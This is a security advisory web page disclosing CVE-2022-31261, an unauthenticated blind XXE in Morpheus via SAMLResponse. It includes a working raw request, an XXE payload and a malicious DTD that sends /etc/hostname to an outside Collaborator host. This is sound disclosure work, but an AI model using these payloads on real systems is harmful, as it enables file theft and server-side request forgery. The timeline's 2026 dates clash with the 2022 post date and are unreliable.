@@ -1,0 +1,324 @@
+<!doctype html>
+
+<html lang="en-us">
+
+<head>
+  <title>Morpheus - Unauthenticated Blind XXE via SAMLResponse - The Tales of N4nj0</title>
+  <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="description" content="The HTML5 Herald" />
+<meta name="author" content="Veno Eivazian" /><meta property="og:title" content="Morpheus - Unauthenticated Blind XXE via SAMLResponse" />
+<meta property="og:description" content="TL;DR I have found an unauthenticated blind XXE via the SAMLResponse parameter on Morpheus versions &lt;= 5.4.3.85.
+Product Information  Organization Name: Morpheus Data Web Page: https://morpheusdata.com/ Email: security@morpheusdata.com Vulnerability Disclosure Info Web Page: https://support.morpheusdata.com/s/article/Morpheus-Data-Security-Response-Policy?language=en_US  Vulnerability Details Blind XML External Entity Injection - CWE-611  Product Line: Morpheus Vulnerable Version: &lt;= 5.4.3.85 Summary: Morpheus 5.4.3.85 allows unauthenticated blind XXE via the SAMLResponse parameter. The product have to be configured as Service Provider with an external SAML-based Identity Provider." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://n4nj0.github.io/advisories/disclosure_report_morpheus_data_morpheus/" />
+<meta property="article:published_time" content="2022-08-01T10:15:00&#43;01:00"/>
+<meta property="article:modified_time" content="2022-08-01T10:15:00&#43;01:00"/>
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Morpheus - Unauthenticated Blind XXE via SAMLResponse"/>
+<meta name="twitter:description" content="TL;DR I have found an unauthenticated blind XXE via the SAMLResponse parameter on Morpheus versions &lt;= 5.4.3.85.
+Product Information  Organization Name: Morpheus Data Web Page: https://morpheusdata.com/ Email: security@morpheusdata.com Vulnerability Disclosure Info Web Page: https://support.morpheusdata.com/s/article/Morpheus-Data-Security-Response-Policy?language=en_US  Vulnerability Details Blind XML External Entity Injection - CWE-611  Product Line: Morpheus Vulnerable Version: &lt;= 5.4.3.85 Summary: Morpheus 5.4.3.85 allows unauthenticated blind XXE via the SAMLResponse parameter. The product have to be configured as Service Provider with an external SAML-based Identity Provider."/>
+
+<meta name="generator" content="Hugo 0.54.0" />
+    
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
+  <link rel="stylesheet" href="https://n4nj0.github.io/fontawesome/css/all.min.css" />
+  
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab|Ruda" />
+  
+  
+  <link rel="stylesheet" type="text/css" href="/css/styles.css" /></head>
+
+<body>
+  <div id="container">
+    <header>
+      <h1>
+                <a href="/">The Tales of N4nj0</a>
+            </h1>
+
+      <ul id="social-media">
+             <li>
+               <a href="https://github.com/n4nj0" title="GitHub">
+               <i class="fab fa-github fa-lg"></i>
+               </a>
+             </li>
+             <li>
+               <a href="https://twitter.com/venoeivazian" title="Twitter">
+               <i class="fab fa-twitter fa-lg"></i>
+               </a>
+             </li>
+             <li>
+               <a href="https://linkedin.com/in/venoeivazian" title="LinkedIn">
+               <i class="fab fa-linkedin fa-lg"></i>
+               </a>
+             </li>
+      </ul>
+      
+    </header>
+
+    
+<nav>
+    <ul>
+        
+        <li>
+            <a class="active" href="/advisories/">
+                <i class="fa-li fa  fa-lg"></i><span>Advisories</span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="" href="/cves/">
+                <i class="fa-li fa  fa-lg"></i><span>CVEs</span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="" href="/posts/">
+                <i class="fa-li fa  fa-lg"></i><span>Posts</span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="" href="/whoami/">
+                <i class="fa-li fa  fa-lg"></i><span>whoami</span>
+            </a>
+        </li>
+        
+    </ul>
+</nav>
+
+
+    <main>
+
+
+
+
+<article>
+
+    <h1>Morpheus - Unauthenticated Blind XXE via SAMLResponse</h1>
+
+    
+      <aside>
+    <ul>
+        <li>
+            <time class="post-date" datetime="2022-08-01T10:15:00&#43;01:00">Aug 1, 2022</time>
+        </li>
+        
+        
+
+        
+
+        <li>5 minutes read</li>
+    </ul>
+</aside>
+
+    
+
+    
+<div class="featured_image">
+    <a href="https://n4nj0.github.io/advisories/disclosure_report_morpheus_data_morpheus/" title="Morpheus - Unauthenticated Blind XXE via SAMLResponse">
+        <img src="">
+    </a>
+</div>
+
+
+
+    
+
+<h2 id="tl-dr">TL;DR</h2>
+
+<p>I have found an unauthenticated blind XXE via the SAMLResponse parameter on Morpheus versions &lt;= 5.4.3.85.</p>
+
+<h2 id="product-information">Product Information</h2>
+
+<ul>
+<li><strong>Organization Name:</strong> Morpheus Data</li>
+<li><strong>Web Page:</strong> <a href="https://morpheusdata.com/">https://morpheusdata.com/</a></li>
+<li><strong>Email:</strong> <a href="security@morpheusdata.com">security@morpheusdata.com</a></li>
+<li><strong>Vulnerability Disclosure Info Web Page:</strong> <a href="https://support.morpheusdata.com/s/article/Morpheus-Data-Security-Response-Policy?language=en_US">https://support.morpheusdata.com/s/article/Morpheus-Data-Security-Response-Policy?language=en_US</a></li>
+</ul>
+
+<h2 id="vulnerability-details">Vulnerability Details</h2>
+
+<h3 id="blind-xml-external-entity-injection-cwe-611"><strong>Blind XML External Entity Injection - CWE-611</strong></h3>
+
+<ul>
+<li><strong>Product Line:</strong> Morpheus</li>
+<li><strong>Vulnerable Version:</strong> &lt;= 5.4.3.85</li>
+<li><strong>Summary:</strong> Morpheus 5.4.3.85 allows unauthenticated blind XXE via the SAMLResponse parameter. The product have to be configured as Service Provider with an external SAML-based Identity Provider. A remote attacker can send a request crafted with an XXE to invoke a malicious DTD hosted on a system that they control and achieve outcomes such as reading local server files or denial of service.</li>
+<li><strong>Prerequisites:</strong> The product have to be configured as Service Provider with an external SAML-based Identity Provider, for example Keycloak.</li>
+<li><strong>CVE and CVSS Score:</strong> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-31261">CVE-2022-31261</a> | <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31261"><strong>7.5</strong> (High)</a></li>
+</ul>
+
+<p><strong>Affected endpoints</strong></p>
+
+<ul>
+<li><strong>URL:</strong> <a href="https://hostname/externalLogin/callback/XafFEYx4I">https://hostname/externalLogin/callback/XafFEYx4I</a></li>
+<li><strong>HTTP Parameter:</strong> SAMLResponse</li>
+</ul>
+
+<p><strong>Step-by-step instructions and PoC</strong></p>
+
+<p>The application is vulnerable to Blind XXE in the default installation, when configured using an external login with a SAML Identity Provider.</p>
+
+<p>To successfully exploit this vulnerability, an attacker must simulate a login via SAML authentication using the identity provider which then sends the <strong>SAMLResponse</strong> parameter to Morpheus web application.it. By discarding or ignoring the contents of the <strong>SAMLResponse</strong> parameter, and inserting a payload containing an XML entity, it is possible to make HTTP requests to the internet and the internal network, carry out Denial of Service attacks and read arbitrary files on the operating system where the XML parser is active.</p>
+
+<p>Initially, to exploit the vulnerability, <strong><a href="https://portswigger.net/burp/pro">Burp Suite</a></strong> tool is used, for its HTTP interception proxy capability, with the <strong><a href="https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e">SAMLRaider</a></strong> plugin, which allows automatic XML encoding.</p>
+
+<p>The attacker&rsquo;s Burp configuration is the following:</p>
+
+<p><img src="/images/90a214675afd13b4658d6eed6b8f5e95.png" alt="Burp - SAMLRaider - Simple XXE payload" /></p>
+
+<p>The XML payload used sends an HTTP request to an external site on the <code>ra5klmp612nksntzc6x2aicbc2iy6n.burpcollaborator.net</code> domain, which is used by <a href="https://portswigger.net/burp/documentation/collaborator">Burp Collaborator</a> and listens to requests sent by the attacker.</p>
+
+<p>The raw request sent following this configuration is the following (the parameter is base64-encoded):</p>
+
+<p><strong>Request:</strong></p>
+
+<pre><code>POST /externalLogin/callback/XafFEYx4I HTTP/1.1
+Host: hostname
+Content-Length: 211
+Cache-Control: max-age=0
+Sec-Ch-Ua: &quot;(Not(A:Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;98&quot;
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: &quot;Linux&quot;
+Upgrade-Insecure-Requests: 1
+Origin: null
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-site
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+SAMLResponse=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IURPQ1RZUEUgZm9vIFsgPCFFTlRJVFkgJSB4eGUgU1lTVEVNICJodHRwOi8vcmE1a2xtcDYxMm5rc250emM2eDJhaWNiYzJpeTZuLmJ1cnBjb2xsYWJvcmF0b3IubmV0Ij4gJXh4ZTsgXT4%3D
+</code></pre>
+
+<p><strong>Response:</strong></p>
+
+<pre><code>HTTP/1.1 302 
+Server: nginx/1.18.0 (Ubuntu)
+Date: Mon, 28 Feb 2022 17:22:30 GMT
+Connection: close
+Set-Cookie: XSRF-TOKEN=c7945782-1299-4204-96da-8e424f5fb187; Path=/; Secure; HttpOnly
+Strict-Transport-Security: max-age=31536000
+Expires: -1
+Cache-Control: no-cache, no-store
+Pragma: no-cache
+X-Frame-Options: SAMEORIGIN
+Content-Security-Policy: default-src 'self' https://www.gstatic.com *.githubusercontent.com data: blob: ws: wss:; base-uri 'self'; object-src 'none'; script-src 'self' 'nonce-Uih2C3Ds30xxymiq' 'unsafe-inline' 'strict-dynamic'  https://www.gstatic.com; style-src 'self' 'unsafe-inline' https://www.gstatic.com
+X-Content-Type-Options: nosniff
+Referrer-Policy: same-origin
+Feature-Policy: vibrate 'none' ; microphone * ; camera 'none' ; gyroscope 'none' ; magnetometer 'none' ; geolocation 'none' ; midi 'self' ; notifications 'self' ; push 'self' ; sync-xhr 'self'
+Set-Cookie: JSESSIONID=2269BBE00926F3E7AB28BD5F780348A0; Path=/; Secure; HttpOnly
+Location: https://hostname/login/account/56?errorMsg=Unable+to+login+to+IDM+due+to+%22org.xml.sax.SAXParseException%3B+systemId%3A+http%3A%2F%2Fra5klmp612nksntzc6x2aicbc2iy6n.burpcollaborator.net%3B+lineNumber%3A+1%3B+columnNumber%3A+2%3B+The+markup+declarations+contained+or+pointed+to+by+the+document+type+declaration+must+be+well-formed.%22
+Content-Length: 0
+</code></pre>
+
+<p>The external site detects the HTTP request from the Java application (please note the User Agent of <code>Java/11.0.14</code>):</p>
+
+<p><img src="/images/5b942a2f217aca426f80fea5b64d85e3.png" alt="Burp - Collaborator - HTTP request received on the external domain" /></p>
+
+<p>The following XXE vulnerability does not display the response on the web application, therefore with this out-of-band technique it is necessary to demonstrate how the vulnerability can be exploited. What an attacker could really achieve is the download of sensitive data. This can be achieved through a blind XXE vulnerability, but it implies that the attacker hosts a malicious DTD on a system he/she controls and then invokes the external DTD on the XXE payload.</p>
+
+<p>For example, the malicious DTD used to exfiltrate the contents of the <code>/etc/hostname</code> file can be the following:</p>
+
+<pre><code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt;
+&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://ra5klmp612nksntzc6x2aicbc2iy6n.burpcollaborator.net/?x=%file;'&gt;&quot;&gt;
+%eval;
+%exfiltrate;
+
+&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http://xxx.xxx.xxx.xxx/malicious.dtd&quot;&gt; %xxe;]&gt;
+</code></pre>
+
+<p>This file is named <code>malicious.dtd</code> and published on another domain, in this case the public IP is redacted to <code>xxx.xxx.xxx.xxx</code>.</p>
+
+<p>The payload is sent base64-encoded on the SAMLResponse parameter, as follows:</p>
+
+<p><img src="/images/0068339212352f43cb58e7cc3e20b239.png" alt="Burp - SAMLRaider - XXE payload to use an external DTD" /></p>
+
+<p>The request arrives on the domain on which the DTD is published, and the file is downloaded by the XML parser:</p>
+
+<p><img src="/images/098b03903526e5c9af7cf40a583b6bd4.png" alt="Download of the external DTD - File /etc/hostname" /></p>
+
+<p>The contents of the <code>/etc/hostname</code> file is then sent to the Burp Collaborator domain inside an HTTP parameter:</p>
+
+<p><img src="/images/6728cbd6a23227996e9e64822080910c.png" alt="Burp - Collaborator - Retrieval of /etc/hostname file" /></p>
+
+<p>As another example, it is also possible to download the <code>/etc/issue</code> file, which contains the version of the operating system. It is sufficient to modify the string as <code>&quot;file:///etc/issue&quot;</code> on the <code>malicious.dtd</code> file .</p>
+
+<p>Also in this case, the payload is sent base64-encoded on the SAMLResponse parameter, as follows:</p>
+
+<p><img src="/images/3c51b5e1f9dabc8d0b428838b0130841.png" alt="Burp - SAMLRaider - XXE payload to use an external DTD" /></p>
+
+<p>The request arrives on the domain on which the DTD is published, and the file is downloaded by the XML parser:</p>
+
+<p><img src="/images/e88d3cbe61450a13ba8750c8b89f418e.png" alt="Download of the external DTD - File /etc/issue" /></p>
+
+<p>The contents of the <code>/etc/issue</code> file is then sent to the Burp Collaborator domain inside an HTTP parameter:</p>
+
+<p><img src="/images/4676bcddec39ef76de6a57170b16eb05.png" alt="Burp - Collaborator - Retrieval of /etc/issue file" /></p>
+
+<p>The version of the JDK on the server does not allow the download of the multiline files, such as <code>/etc/passwd</code>.
+However, this limitation is not relevant, as an attacker could overcome it by using more advanced techniques.</p>
+
+<p>Also, please note that the level of the following issue is <strong>Critical</strong>, as it is possible to exploit the vulnerability <strong>without authentication</strong> on the web application.</p>
+
+<p>The vulnerability is tested on Morpheus version 5.4.3.85, as depicted by the following
+screenshot:</p>
+
+<p><img src="/images/884b1d32fbc569217910855e2cf138cc.png" alt="Morpheus version 5.4.3.85" /></p>
+
+<p><strong>Security Impact</strong></p>
+
+<p>By exploiting this issue an unauthenticated attacker is able to make HTTP requests to the internet and the internal network, carry out Denial of Service attacks and read arbitrary files on the operating system where the XML parser is active.</p>
+
+<h2 id="timeline">Timeline</h2>
+
+<ul>
+<li><strong>15/03/2022</strong>: First disclosure via e-mail to <a href="security@morpheusdata.com">security@morpheusdata.com</a></li>
+<li><strong>Several times in the middle</strong>: Ping requests for status update (We&rsquo;ve heard of a man, who heard another man&hellip;)</li>
+<li><strong>21/05/2026</strong>: The vendor reserved the CVE on MITRE.</li>
+<li><strong>24/05/2026</strong>: NVD scored <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31261">CVE-2022-31261</a> as <strong>7.5</strong> (High).</li>
+</ul>
+
+
+</article>
+
+
+<section class="post-nav">
+    <ul>
+        
+        <li>
+            <a href="https://n4nj0.github.io/advisories/webtareas-multiple-vulnerabilities-i/"><i class="fa fa-chevron-circle-left"></i> webTareas 2.4 - Multiple Vulnerabilities</a>
+        </li>
+        
+        
+    </ul>
+</section>
+  
+    
+    
+  
+
+
+
+
+
+<footer>
+  <div>
+    <p>
+      <h6>
+      &copy; 2020 Veno Eivazian.
+      <a href="https://creativecommons.org/licenses/by/3.0/" title="Creative Commons Attribution">Some rights reserved</a>;
+      please attribute properly and link back.
+      </h6>
+    </p>
+  </div>
+</footer>
+
